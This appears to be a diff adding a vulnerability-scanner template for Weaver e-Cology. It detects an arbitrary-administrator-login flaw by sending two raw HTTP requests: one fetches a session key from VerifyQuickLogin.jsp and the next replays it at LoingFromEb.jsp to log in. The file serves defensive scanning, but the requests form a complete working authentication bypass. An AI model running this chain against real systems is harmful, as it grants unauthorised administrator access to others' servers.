@@ -1,0 +1,56 @@
+id: weaver-e_cology-unsafe-account-ct-483454
+
+info:
+  name: Weaver e-Cology Unsafe Account Login
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a vulnerability in Weaver e-Cology allowing arbitrary administrator logins via the VerifyQuickLogin.jsp endpoint.
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+    - https://zhuanlan.zhihu.com/p/562336905
+    - https://www.weaver.com.cn/
+    - https://work.weixin.qq.com/kfid/kfcbb755e1fd954182d
+
+http:
+  - id: step-1
+    raw:
+      - |
+        POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        identifier=1&language=1&ipaddress=x.x.x.x
+    extractors:
+      - type: regex
+        name: sessionkey
+        internal: true
+        group: 1
+        regex:
+          - '\"sessionkey\":(.+?)\"'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"sessionkey":"'
+          - '"message":"1"'
+      - type: status
+        status:
+          - 200
+
+  - id: step-2
+    raw:
+      - |
+        POST /mobile/plugin/plus/login/LoingFromEb.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        loginkey={{sessionkey}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'window.location.href="/login/RemindLogin.jsp?RedirectFile=/wui/main.jsp";'
+      - type: status
+        status:
+          - 200
